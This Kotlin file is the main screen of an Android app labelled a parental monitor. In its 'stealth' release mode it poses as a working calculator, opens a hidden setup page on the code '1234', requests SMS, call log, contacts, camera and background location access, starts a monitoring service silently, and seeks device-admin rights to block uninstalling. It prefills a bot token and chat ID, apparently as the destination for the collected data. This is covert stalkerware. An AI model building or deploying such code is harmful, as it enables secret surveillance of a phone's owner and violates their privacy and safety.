package com.redeye.parentalmonitor.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.receiver.AdminReceiver
import com.redeye.parentalmonitor.service.MonitoringService
import android.content.Context
import com.redeye.parentalmonitor.BuildConfig

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.CAMERA
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA
        )
    }

    private val parentalLocationPermissions = arrayOf(
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_FINE_LOCATION
    )

    private val parentalLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val fine = result[Manifest.permission.ACCESS_FINE_LOCATION] == true
            val coarse = result[Manifest.permission.ACCESS_COARSE_LOCATION] == true
            if ((fine || coarse) && !hasBackgroundLocation()) {
                try {
                    parentalBackgroundLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                } catch (_: Exception) {
                }
            }
        }
        if (BuildConfig.PARENTAL_UI) refreshParentalMonitoring()
    }

    private val parentalBackgroundLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        if (BuildConfig.PARENTAL_UI) refreshParentalMonitoring()
    }

    private fun refreshParentalMonitoring() {
        updateParentalStatus()
        if (preferencesManager.isConfigured()) {
            try {
                startMonitoringService()
                preferencesManager.isMonitoringEnabled = true
            } catch (_: Exception) {
            }
        }
    }

    private fun hasForegroundLocation(): Boolean {
        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            return true
        }
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestParentalPermissions() {
        if (!hasAllPermissions()) {
            permissionLauncher.launch(requiredPermissions)
            return
        }
        if (!hasForegroundLocation()) {
            parentalLocationLauncher.launch(parentalLocationPermissions)
            return
        }
        if (!hasBackgroundLocation()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    parentalBackgroundLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                } catch (e: Exception) {
                    openAppSettings()
                }
            }
            return
        }
        Toast.makeText(this, getString(R.string.setup_bg_granted), Toast.LENGTH_SHORT).show()
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_SHORT).show()
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            android.util.Log.i("MainActivity", "✅ All permissions granted!")
            Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
            
            // RELEASE mode: Auto-start service after permissions granted
            if (!BuildConfig.DEBUG && preferencesManager.isConfigured()) {
                android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
                if (!preferencesManager.isMonitoringEnabled) {
                    try {
                        startMonitoringService()
                        preferencesManager.isMonitoringEnabled = true
                        android.util.Log.i("MainActivity", "✓ Service started successfully!")
                        Toast.makeText(this, getString(R.string.msg_monitoring_started), Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}")
                    }
                }
            }
            
        } else {
            android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
            Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        android.util.Log.i("MainActivity", "═══ MainActivity onCreate ═══")
        android.util.Log.i("MainActivity", "BuildConfig.DEBUG = ${BuildConfig.DEBUG}")
        
        preferencesManager = PreferencesManager(this)

        if (BuildConfig.PARENTAL_UI) {
            prefillFromBuildConfig()
            setContentView(R.layout.activity_parental)
            initParentalUi()
            startMonitoringInBackground()
            return
        }

        if (!BuildConfig.DEBUG) {
            android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
            setContentView(R.layout.activity_calculator)
            initCalculator()
            startMonitoringInBackground()
            return
        }

        android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
        setContentView(R.layout.activity_calculator)
        initCalculator()
    }
    
    override fun onResume() {
        super.onResume()
        if (BuildConfig.PARENTAL_UI) updateParentalStatus()
    }

    private var parentalStatusText: android.widget.TextView? = null

    private fun prefillFromBuildConfig() {
        if (BuildConfig.BOT_TOKEN.isNotEmpty() && preferencesManager.botToken.isEmpty()) {
            preferencesManager.botToken = BuildConfig.BOT_TOKEN
        }
        if (BuildConfig.CHAT_ID.isNotEmpty() && preferencesManager.chatId.isEmpty()) {
            preferencesManager.chatId = BuildConfig.CHAT_ID
        }
    }

    private fun initParentalUi() {
        parentalStatusText = findViewById(R.id.parentalStatusText)
        findViewById<com.google.android.material.button.MaterialButton>(R.id.parentalGrantButton).setOnClickListener {
            requestParentalPermissions()
        }
        findViewById<com.google.android.material.button.MaterialButton>(R.id.parentalPrivacyButton).setOnClickListener {
            com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setTitle(R.string.parental_privacy_title)
                .setMessage(R.string.parental_privacy_text)
                .setPositiveButton(android.R.string.ok, null)
                .show()
        }
        updateParentalStatus()
    }

    private fun updateParentalStatus() {
        parentalStatusText?.text = getString(
            R.string.parental_status_fmt,
            getString(if (preferencesManager.isMonitoringEnabled) R.string.monitoring_active else R.string.monitoring_inactive),
            getString(if (hasAllPermissions()) android.R.string.ok else R.string.permissions_required)
        ) + "\n" + getString(
            R.string.setup_location_fmt,
            getString(if (hasForegroundLocation()) android.R.string.ok else R.string.permissions_required),
            getString(if (hasBackgroundLocation()) android.R.string.ok else R.string.permissions_required)
        )
        try {
            findViewById<com.google.android.material.button.MaterialButton>(R.id.parentalGrantButton).text = when {
                !hasAllPermissions() -> getString(R.string.grant_permissions)
                !hasForegroundLocation() || !hasBackgroundLocation() -> getString(R.string.setup_bg_request)
                else -> getString(R.string.msg_permissions_granted)
            }
        } catch (_: Exception) {
        }
    }

    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════
    
    private var calculatorDisplay: android.widget.TextView? = null
    private var calculatorHistory: android.widget.TextView? = null
    private var currentNumber = ""
    private var operator = ""
    private var previousNumber = ""
    private var lastExpression = ""
    private var justCalculated = false
    
    private fun initCalculator() {
        android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        calculatorHistory = findViewById(R.id.calculatorHistory)
        
        // Number buttons
        findViewById<android.widget.Button>(R.id.btn0).setOnClickListener { appendNumber("0") }
        findViewById<android.widget.Button>(R.id.btn1).setOnClickListener { appendNumber("1") }
        findViewById<android.widget.Button>(R.id.btn2).setOnClickListener { appendNumber("2") }
        findViewById<android.widget.Button>(R.id.btn3).setOnClickListener { appendNumber("3") }
        findViewById<android.widget.Button>(R.id.btn4).setOnClickListener { appendNumber("4") }
        findViewById<android.widget.Button>(R.id.btn5).setOnClickListener { appendNumber("5") }
        findViewById<android.widget.Button>(R.id.btn6).setOnClickListener { appendNumber("6") }
        findViewById<android.widget.Button>(R.id.btn7).setOnClickListener { appendNumber("7") }
        findViewById<android.widget.Button>(R.id.btn8).setOnClickListener { appendNumber("8") }
        findViewById<android.widget.Button>(R.id.btn9).setOnClickListener { appendNumber("9") }
        findViewById<android.widget.Button>(R.id.btnDot).setOnClickListener { appendNumber(".") }
        
        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus).setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus).setOnClickListener { setOperator("-") }
        findViewById<android.widget.Button>(R.id.btnMultiply).setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide).setOnClickListener { setOperator("÷") }
        
        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals).setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear).setOnClickListener { clear() }
        
        android.util.Log.i("MainActivity", "✓ Calculator initialized")
    }
    
    private fun appendNumber(number: String) {
        justCalculated = false
        if (currentNumber == "Error") {
            currentNumber = ""
            previousNumber = ""
            operator = ""
        }
        if (currentNumber == "0" && number != ".") {
            currentNumber = number
        } else {
            if (number == "." && currentNumber.contains(".")) return
            currentNumber += number
        }
        
        updateCalculatorDisplay()
    }
    
    private fun setOperator(op: String) {
        justCalculated = false
        if (currentNumber.isEmpty()) return
        if (previousNumber.isNotEmpty()) {
            calculate()
        }
        operator = op
        previousNumber = currentNumber
        currentNumber = ""
    }
    
    private fun calculate() {
        if (currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
            android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            currentNumber = ""
            previousNumber = ""
            operator = ""
            updateCalculatorDisplay()
            openSetupPage()
            return
        }
        
        if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
        
        val currentStr = currentNumber
        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentStr.toDoubleOrNull() ?: return
        
        val result = when (operator) {
            "+" -> num1 + num2
            "-" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
            else -> num2
        }
        
        currentNumber = if (result.isNaN() || result.isInfinite()) {
            "Error"
        } else if (result % 1.0 == 0.0) {
            result.toInt().toString()
        } else {
            result.toString()
        }

        lastExpression = "$previousNumber $operator $currentStr ="
        justCalculated = true
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }
    
    private fun clear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        lastExpression = ""
        justCalculated = false
        updateCalculatorDisplay()
    }

    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = if (currentNumber.isEmpty()) "0" else currentNumber
        calculatorHistory?.text = when {
            justCalculated -> lastExpression
            operator.isNotEmpty() -> "$previousNumber $operator"
            else -> ""
        }
    }
    
    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java))
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to open setup", e)
            Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
        }
    }

    private fun startMonitoringInBackground() {
        android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
        
        // Check if already configured and has permissions
        if (!preferencesManager.isConfigured()) {
            android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
            return
        }
        
        // Auto-activate Device Admin (silently)
        if (!BuildConfig.PARENTAL_UI && !isDeviceAdminActive()) {
            android.util.Log.w("MainActivity", "Device Admin not active - activating silently...")
            activateDeviceAdmin()
        }
        
        // Silently request permissions if needed
        if (!hasAllPermissions()) {
            android.util.Log.w("MainActivity", "Requesting permissions silently...")
            requestPermissions()
            return
        }
        
        // Start monitoring service silently
        if (!preferencesManager.isMonitoringEnabled) {
            try {
                startMonitoringService()
                preferencesManager.isMonitoringEnabled = true
                android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
            }
        } else {
            android.util.Log.i("MainActivity", "Monitoring already running")
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    // DEVICE ADMIN FUNCTIONS (UNINSTALL PROTECTION)
    // ═══════════════════════════════════════════════════════════
    
    private fun requestPermissions() {
        permissionLauncher.launch(requiredPermissions)
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun startMonitoringService() {
        android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }

        android.util.Log.d("MainActivity", "Starting service...")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
                android.util.Log.i("MainActivity", "Started as foreground service")
            } else {
                startService(intent)
                android.util.Log.i("MainActivity", "Started as regular service")
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, AdminReceiver::class.java)
        return devicePolicyManager.isAdminActive(adminComponent)
    }
    
    private fun activateDeviceAdmin() {
        android.util.Log.i("MainActivity", "Activating Device Admin...")
        
        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, AdminReceiver::class.java)
        
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Ilovani o'chirishdan himoya qilish uchun administrator ruxsati kerak"
                )
            }
            try {
                startActivity(intent)
                Toast.makeText(this, getString(R.string.msg_enabling_protection), Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Failed to activate Device Admin", e)
                Toast.makeText(this, getString(R.string.msg_admin_failed), Toast.LENGTH_SHORT).show()
            }
        } else {
            Toast.makeText(this, getString(R.string.setup_admin_on), Toast.LENGTH_SHORT).show()
            android.util.Log.i("MainActivity", "Device Admin already active")
        }
    }
}
